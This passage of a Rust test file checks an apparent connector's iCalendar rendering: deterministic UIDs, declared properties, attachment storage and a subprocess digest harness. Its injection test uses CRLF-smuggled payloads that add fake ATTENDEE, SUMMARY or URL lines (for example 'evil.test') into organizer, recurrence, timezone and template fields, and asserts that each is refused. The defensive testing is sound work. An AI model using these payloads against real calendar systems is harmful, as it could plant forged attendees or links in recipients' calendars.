/// assertion below can only mean "refused" and never "wrote something else".
fn calendar_refusal(input: &JsonValue, context: &LocalContext, field: &str) -> String {
    match operation("calendar.render").execute(input, context, None, &StopSignal::new()) {
        Err(failure) => failure.code().to_owned(),
        Ok(LocalProduct::Value(value)) => panic!(
            "`{field}` reached the calendar:\n{}",
            value["ics"].as_str().unwrap_or_default()
        ),
        Ok(LocalProduct::Artifact { .. }) => panic!("`{field}` reached a stored calendar"),
    }
}

fn render_calendar(input: &JsonValue) -> JsonValue {
    match operation("calendar.render")
        .execute(input, &calendar_context(), None, &StopSignal::new())
        .expect("the fixture renders")
    {
        LocalProduct::Value(value) => value,
        LocalProduct::Artifact { .. } => panic!("this fixture names no attachment"),
    }
}

/// Spec 019 §7 `calendar_uid_comes_from_input`.
///
/// A re-render with the same input produces the same UID; a missing UID is
/// rejected. The second half is the load-bearing one: a generated UID would
/// make every re-send a duplicate event in the recipient's calendar.
#[test]
fn calendar_uid_comes_from_input() {
    let input = calendar_input(json!([{
        "uid": "order:A-1@example.test",
        "summary": "Delivery for A-1",
        "start": "2026-03-06T09:00:00Z",
        "end": "2026-03-06T10:00:00Z"
    }]));

    let first = render_calendar(&input);
    let second = render_calendar(&input);
    assert_eq!(first, second, "two renders of one input differ");
    let ics = first["ics"].as_str().expect("the calendar is inline text");
    assert!(ics.contains("UID:order:A-1@example.test"), "{ics}");
    assert_eq!(
        ics.matches("UID:").count(),
        1,
        "one declared event is one event: {ics}"
    );

    // A missing UID, an empty one, and a null one are all refused; none of them
    // is quietly filled in.
    for events in [
        json!([{ "summary": "x", "start": "2026-03-06T09:00:00Z", "end": "2026-03-06T10:00:00Z" }]),
        json!([{ "uid": "", "start": "2026-03-06T09:00:00Z", "end": "2026-03-06T10:00:00Z" }]),
        json!([{ "uid": null, "start": "2026-03-06T09:00:00Z", "end": "2026-03-06T10:00:00Z" }]),
    ] {
        let failure = operation("calendar.render")
            .execute(
                &calendar_input(events),
                &calendar_context(),
                None,
                &StopSignal::new(),
            )
            .expect_err("an event without a declared UID is not an event");
        assert_eq!(failure.code(), "local_calendar_uid_missing");
        assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    }

    // And the DTSTAMP is declared too, so the file does not move on its own:
    // `icalendar` fills it from the wall clock when it is absent.
    assert!(ics.contains("DTSTAMP:20260304T093000Z"), "{ics}");
    let mut later = input.clone();
    later["document_timestamp"] = json!("2026-03-04T10:30:00Z");
    assert_ne!(render_calendar(&later)["ics"], first["ics"]);
}

/// Everything an event carries is declared: the calendar-level properties come
/// from the template, and the per-event ones from the input.
#[test]
fn a_calendar_writes_the_declared_properties_and_nothing_else() {
    let rendered = render_calendar(&calendar_input(json!([
        {
            "uid": "order:A-1@example.test",
            "summary": "Delivery for A-1",
            "description": "Two boxes",
            "location": "Loading bay 3",
            "start": "2026-03-06T09:00:00",
            "end": "2026-03-06T10:00:00",
            "timezone": "Europe/Berlin",
            "organizer": "mailto:ops@example.test",
            "attendees": ["mailto:driver@example.test", "mailto:customer@example.test"],
            "recurrence": "FREQ=WEEKLY;COUNT=4",
            "sequence": 2
        },
        {
            "uid": "order:A-2@example.test",
            "summary": "Delivery for A-2",
            "start": "2026-03-07T09:00:00Z",
            "end": "2026-03-07T10:00:00Z"
        }
    ])));
    let ics = rendered["ics"]
        .as_str()
        .expect("the calendar is inline text");

    for expected in [
        "PRODID:-//donat//deliveries//EN",
        "METHOD:REQUEST",
        "X-WR-CALNAME:Deliveries",
        "DTSTART;TZID=Europe/Berlin:20260306T090000",
        "DTEND;TZID=Europe/Berlin:20260306T100000",
        "LOCATION:Loading bay 3",
        "ORGANIZER:mailto:ops@example.test",
        "ATTENDEE:mailto:driver@example.test",
        "ATTENDEE:mailto:customer@example.test",
        "RRULE:FREQ=WEEKLY;COUNT=4",
        "SEQUENCE:2",
        "DTSTART:20260307T090000Z",
    ] {
        assert!(ics.contains(expected), "missing `{expected}`:\n{ics}");
    }
    assert_eq!(rendered["events"], json!(2));

    // A zoned event that also carries a `Z` is a contradiction, not a default.
    let failure = operation("calendar.render")
        .execute(
            &calendar_input(json!([{
                "uid": "x@example.test",
                "start": "2026-03-06T09:00:00Z",
                "end": "2026-03-06T10:00:00Z",
                "timezone": "Europe/Berlin"
            }])),
            &calendar_context(),
            None,
            &StopSignal::new(),
        )
        .expect_err("a zoned event declares local times");
    assert_eq!(failure.code(), "local_input_contract");
}

/// No declared value may write a second line of the `.ics`.
///
/// An iCalendar file is a line-oriented format whose lines end in CRLF, so a
/// value carrying one *is* a property injection. `icalendar` escapes only the
/// properties it classifies as `TEXT`: `ORGANIZER` and `ATTENDEE` are
/// `CAL-ADDRESS`, `RRULE` is `RECUR`, a `TZID` is a parameter, and all of them
/// are written through verbatim. And even the `TEXT` escape does not cover a
/// bare `\r`. So the refusal is ours, it is over every value this operation
/// writes rather than the three that happen to be unescaped today, and it is a
/// refusal rather than an escape because none of these fields has any
/// legitimate use for a control character.
#[test]
fn a_calendar_value_can_never_write_a_second_line() {
    let event = |field: &str, value: &str| {
        let mut event = json!({
            "uid": "order:A-1@example.test",
            "summary": "Delivery for A-1",
            "start": "2026-03-06T09:00:00Z",
            "end": "2026-03-06T10:00:00Z"
        });
        event[field] = json!(value);
        event
    };

    // The three the classification leaves raw, with the payload that made this
    // a finding: a real CRLF and a whole extra property behind it.
    let injections = [
        (
            "organizer",
            "mailto:a@b.c\r\nATTENDEE;PARTSTAT=ACCEPTED:mailto:victim@x.y",
        ),
        ("recurrence", "FREQ=WEEKLY\r\nATTENDEE:mailto:victim@x.y"),
        ("summary", "Delivery\rDESCRIPTION:injected"),
        ("description", "Two boxes\nSUMMARY:injected"),
        ("location", "Bay 3\r\nURL:http://evil.test"),
        ("uid", "a@b.c\r\nSUMMARY:injected"),
    ];
    for (field, payload) in injections {
        assert_eq!(
            calendar_refusal(
                &calendar_input(json!([event(field, payload)])),
                &calendar_context(),
                field
            ),
            "local_calendar_control_character",
            "`{field}` accepted a control character"
        );
    }

    // The list-valued and parameter-valued ones, which do not fit the shape
    // above but reach the same writer.
    let mut attendees = json!({
        "uid": "order:A-1@example.test",
        "start": "2026-03-06T09:00:00Z",
        "end": "2026-03-06T10:00:00Z"
    });
    attendees["attendees"] = json!(["mailto:ok@x.y", "mailto:a@b.c\r\nSUMMARY:injected"]);
    assert_eq!(
        calendar_refusal(
            &calendar_input(json!([attendees])),
            &calendar_context(),
            "attendees"
        ),
        "local_calendar_control_character"
    );

    let mut zoned = json!({
        "uid": "order:A-1@example.test",
        "start": "2026-03-06T09:00:00",
        "end": "2026-03-06T10:00:00"
    });
    zoned["timezone"] = json!("Europe/Berlin\r\nATTENDEE:mailto:victim@x.y");
    assert_eq!(
        calendar_refusal(
            &calendar_input(json!([zoned])),
            &calendar_context(),
            "timezone"
        ),
        "local_calendar_control_character"
    );

    // And the calendar-level properties, which come from the template rather
    // than from the process, and are written through the same three raw slots.
    let poisoned = context(vec![with_inputs(
        spec(
            "deliveries",
            DocumentKind::Calendar,
            "/deliveries.json",
            &[(
                "/deliveries.json",
                "{\"product_id\":\"-//donat//x//EN\\r\\nMETHOD:CANCEL\",\"method\":\"REQUEST\"}",
            )],
        ),
        &["events"],
    )]);
    assert_eq!(
        calendar_refusal(
            &calendar_input(json!([{
                "uid": "order:A-1@example.test",
                "start": "2026-03-06T09:00:00Z",
                "end": "2026-03-06T10:00:00Z"
            }])),
            &poisoned,
            "product_id"
        ),
        "local_calendar_control_character",
        "a template's own layout is checked like everything else"
    );

    // The other direction: everything above renders once the control character
    // is gone, so the refusal is about the character and not about the field.
    let clean = render_calendar(&calendar_input(json!([{
        "uid": "order:A-1@example.test",
        "summary": "Delivery, for; A-1",
        "start": "2026-03-06T09:00:00",
        "end": "2026-03-06T10:00:00",
        "timezone": "Europe/Berlin",
        "organizer": "mailto:ops@example.test",
        "attendees": ["mailto:driver@example.test"],
        "recurrence": "FREQ=WEEKLY;COUNT=4"
    }])));
    let ics = clean["ics"].as_str().expect("the calendar is inline text");
    // Every line of a rendered calendar begins with a property name or a fold.
    for line in ics.split("\r\n").filter(|line| !line.is_empty()) {
        assert!(
            line.starts_with(' ')
                || line
                    .split([':', ';'])
                    .next()
                    .is_some_and(|key| key.chars().all(|c| c.is_ascii_uppercase() || c == '-')),
            "unexpected line `{line}` in:\n{ics}"
        );
    }
}

/// The stored half: naming an attachment column produces a file instead of an
/// inline string, and the file is the same bytes.
#[test]
fn a_calendar_is_stored_when_the_activity_names_a_column() {
    let mut input = calendar_input(json!([{
        "uid": "order:A-1@example.test",
        "start": "2026-03-06T09:00:00Z",
        "end": "2026-03-06T10:00:00Z"
    }]));
    let inline = render_calendar(&input)["ics"]
        .as_str()
        .expect("the calendar is inline text")
        .to_owned();

    input["attachment"] = json!("public.order.calendar_file");
    input["claim_role"] = json!("app");
    input["file_name"] = json!("deliveries.ics");
    let LocalProduct::Artifact { artifact, metadata } = operation("calendar.render")
        .execute(&input, &calendar_context(), None, &StopSignal::new())
        .expect("a calendar bound to a column is stored")
    else {
        panic!("naming a column produces a file");
    };
    assert_eq!(artifact.media_type(), "text/calendar");
    assert_eq!(artifact.file_name(), "deliveries.ics");
    assert_eq!(artifact.claim_role(), "app");
    assert_eq!(artifact.bytes(), inline.as_bytes());
    assert_eq!(metadata["events"], json!(1));
    assert!(
        metadata.get("ics").is_none(),
        "a stored calendar's bytes are not repeated in the activity result"
    );
}

// ---------------------------------------------------------------------------
// The subprocess harness
// ---------------------------------------------------------------------------

/// The environment variable that turns this test binary into a one-shot
/// renderer.
const SUBPROCESS: &str = "DONAT_DOCUMENT_RENDER_PROBE";

/// Render the invoice fixture in a freshly started process and return the hex
/// digest of its bytes.
fn subprocess_digest(environment: &[(&str, &str)]) -> String {
    let executable = std::env::current_exe().expect("a test binary has a path");
    let mut command = std::process::Command::new(executable);
    command
        .arg("--exact")
        .arg("renders_the_invoice_fixture_for_the_subprocess_harness")
        .arg("--nocapture")
        .env(SUBPROCESS, "1");
    for (name, value) in environment {
        command.env(name, value);
    }
    let output = command.output().expect("the subprocess runs");
    let text = String::from_utf8_lossy(&output.stdout);
    text.lines()
        .find_map(|line| line.strip_prefix("digest="))
        .unwrap_or_else(|| {
            panic!(
                "the subprocess printed no digest:\n{text}\n{}",
                String::from_utf8_lossy(&output.stderr)
            )
        })
        .trim()
        .to_owned()
}

/// The subprocess half of the harness. It is a no-op unless [`SUBPROCESS`] is
/// set, so the ordinary test run neither renders it twice nor depends on it.
#[test]
fn renders_the_invoice_fixture_for_the_subprocess_harness() {
    if std::env::var_os(SUBPROCESS).is_none() {
        return;
    }
    let bytes = render_pdf(&invoice_context(), &invoice_input());
    println!("digest={}", hex(&Sha256::digest(&bytes)));
}
